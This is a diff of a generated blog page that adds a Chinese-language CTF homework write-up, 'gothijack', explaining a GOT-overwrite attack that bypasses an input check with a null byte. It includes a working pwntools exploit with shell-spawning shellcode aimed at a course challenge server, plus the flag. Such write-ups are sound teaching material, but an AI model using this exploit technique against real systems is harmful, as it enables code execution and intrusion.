@@ -104,6 +104,10 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
     
+      <a href="#hw2" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
     
       <header class="md-header" data-md-component="header">
   <nav class="md-header-nav md-grid">
@@ -423,10 +427,68 @@
     
     <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
     
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Hw2
+      </label>
     
     <a href="./" title="Hw2" class="md-nav__link md-nav__link--active">
       Hw2
     </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#gothijack" title="gothijack" class="md-nav__link">
+    gothijack
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#concept" title="concept" class="md-nav__link">
+    concept
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit" title="exploit" class="md-nav__link">
+    exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag" title="flag" class="md-nav__link">
+    flag
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
     
   </li>
 
@@ -604,6 +666,64 @@
               </div>
             
             
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#gothijack" title="gothijack" class="md-nav__link">
+    gothijack
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#concept" title="concept" class="md-nav__link">
+    concept
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit" title="exploit" class="md-nav__link">
+    exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag" title="flag" class="md-nav__link">
+    flag
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
           
           <div class="md-content">
             <article class="md-content__inner md-typeset">
@@ -612,9 +732,58 @@
                   <a href="https://github.com/ss8651twtw/blog/blob/master/docs/course/csie/hw2.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                 
                 
-                  <h1>Hw2</h1>
-                
-                
+                <h1 id="hw2">Hw2</h1>
+<h2 id="gothijack">gothijack</h2>
+<div class="highlight"><pre><span></span>Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX disabled
+PIE:      No PIE (0x400000)
+RWX:      Has RWX segments
+</pre></div>
+
+<h3 id="concept">concept</h3>
+<p>該程式很單純的做了四件事</p>
+<ol>
+<li>輸入 name</li>
+<li>輸入想修改的 address</li>
+<li>輸入想修改的值</li>
+<li>輸出 done !</li>
+</ol>
+<p>依題目提示可知是使用 got hijack 的技巧來達成攻擊，不過這題有 canary 不能直接 overflow 造出 ROP chain</p>
+<p>不過有個可以可控的 buffer 可以利用，使用 gdb 觀察一下發現該處可寫可執行！！！</p>
+<p><img alt="" src="https://i.imgur.com/8RqKD74.png" /></p>
+<p><img alt="" src="https://i.imgur.com/pauryBM.png" /></p>
+<p>如此就可以塞入 shellcode 並修改 puts 的 got 為 buffer address，使得最後要輸出時 call puts 會跳到寫好的 shellcode 執行</p>
+<p>但是輸入的 buffer 讀進來後有個 check 函數檢查輸入要為 alpha 或 number，不過他是用 strlen 判斷長度可以使用 null byte 繞過，因為他是以 null byte 當作字串結尾</p>
+<p><img alt="" src="https://i.imgur.com/MmUJNOm.png" /></p>
+<p>所以我們可以在 shellcode 前面塞一個 null byte 繞過檢查，而之後 puts got 的值改成 buffer address + 1 即可</p>
+<h3 id="exploit">exploit</h3>
+<p>使用 objdump 可以看到 puts 的 got</p>
+<p><img alt="" src="https://i.imgur.com/ZyWex9z.png" /></p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># r = process(&#39;./gothijack&#39;)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;csie.ctf.tw&#39;</span><span class="p">,</span> <span class="mi">10129</span><span class="p">)</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\</span>
+<span class="se">\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s1">&#39;</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="s1">&#39;601020&#39;</span>
+<span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0x6010a1</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">))</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+<h3 id="flag">flag</h3>
+<p><code>FLAG{G0THiJJack1NG}</code></p>
                 
                   
                 
